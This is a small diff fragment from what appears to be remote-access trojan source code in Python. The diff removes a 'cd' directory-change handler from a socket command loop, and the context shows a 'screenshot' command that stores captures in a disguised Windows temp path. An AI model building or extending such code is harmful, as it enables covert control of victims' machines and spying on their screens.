@@ -50,12 +50,6 @@ def recieveCommands():
             except:
                 error = (RED + '[!] There was an unknown error!')
                 s.send(str.encode(error))
-        elif data[:2].decode("utf-8") == 'cd':
-            try:
-                os.chdir(data[3:].decode("utf-8"))
-            except:
-                failed = RED + BOLD + "[!] Couldn't change directory"
-                s.send(str.encode(failed))
         elif data[:].decode("utf-8") == 'screenshot':
             global pathToScreenshot
             path = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
